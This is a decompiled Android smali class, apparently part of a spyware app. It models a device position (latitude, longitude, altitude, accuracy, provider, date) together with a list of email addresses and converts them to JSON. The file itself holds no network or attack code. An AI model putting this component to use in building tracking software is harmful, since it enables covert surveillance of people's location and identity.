.class public Landroid/spyware/model/Position;
.super Ljava/lang/Object;
.source "Position.java"


# instance fields
.field private accuracy:F

.field private altitude:D

.field private date:Ljava/util/Date;

.field private email_addresses:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private latitude:D

.field private longitude:D

.field private provider:Ljava/lang/String;


# direct methods
.method public constructor <init>(FDLjava/util/Date;Ljava/util/List;DDLjava/lang/String;)V
    .registers 13
    .param p1, "accuracy"    # F
    .param p2, "altitude"    # D
    .param p4, "date"    # Ljava/util/Date;
    .param p6, "latitude"    # D
    .param p8, "longitude"    # D
    .param p10, "provider"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(FD",
            "Ljava/util/Date;",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;DD",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 41
    .local v7, "email_addresses":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    .line 42
    iput v3, v2, Landroid/spyware/model/Position;->accuracy:F

    .line 43
    iput-wide v4, v2, Landroid/spyware/model/Position;->altitude:D

    .line 44
    iput-object v6, v2, Landroid/spyware/model/Position;->date:Ljava/util/Date;

    .line 45
    iput-object v7, v2, Landroid/spyware/model/Position;->email_addresses:Ljava/util/List;

    .line 46
    iput-wide v8, v2, Landroid/spyware/model/Position;->latitude:D

    .line 47
    iput-wide v10, v2, Landroid/spyware/model/Position;->longitude:D

    .line 48
    invoke-virtual {v12}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v0

    iput-object v0, v2, Landroid/spyware/model/Position;->provider:Ljava/lang/String;

    .line 49
    return-void
.end method


# virtual methods
.method public toJSON()Lorg/json/JSONObject;
    .registers 7

    .prologue
    .line 52
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 55
    .local v0, "JSONPosition":Lorg/json/JSONObject;
    :try_start_5
    const-string v2, "accuracy"

    iget v3, v6, Landroid/spyware/model/Position;->accuracy:F

    float-to-double v4, v3

    invoke-virtual {v0, v2, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 56
    const-string v2, "altitude"

    iget-wide v4, v6, Landroid/spyware/model/Position;->altitude:D

    invoke-virtual {v0, v2, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 57
    const-string v2, "date"

    new-instance v3, Ljava/text/SimpleDateFormat;

    const-string v4, "yyyy-MM-dd HH:mm:ss"

    sget-object v5, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-direct {v3, v4, v5}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    iget-object v4, v6, Landroid/spyware/model/Position;->date:Ljava/util/Date;

    invoke-virtual {v3, v4}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 58
    const-string v2, "email_adresses"

    new-instance v3, Lorg/json/JSONArray;

    iget-object v4, v6, Landroid/spyware/model/Position;->email_addresses:Ljava/util/List;

    invoke-direct {v3, v4}, Lorg/json/JSONArray;-><init>(Ljava/util/Collection;)V

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 59
    const-string v2, "latitude"

    iget-wide v4, v6, Landroid/spyware/model/Position;->latitude:D

    invoke-virtual {v0, v2, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 60
    const-string v2, "longitude"

    iget-wide v4, v6, Landroid/spyware/model/Position;->longitude:D

    invoke-virtual {v0, v2, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 61
    const-string v2, "provider"

    iget-object v3, v6, Landroid/spyware/model/Position;->provider:Ljava/lang/String;

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_49
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_49} :catch_4a

    .line 66
    :goto_49
    return-object v0

    .line 62
    :catch_4a
    move-exception v1

    .line 63
    .local v1, "ex":Lorg/json/JSONException;
    const-string v2, "::trace"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-class v4, Landroid/spyware/model/Position;

    invoke-virtual {v4}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "->toJSON: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-static {v1}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_49
.end method
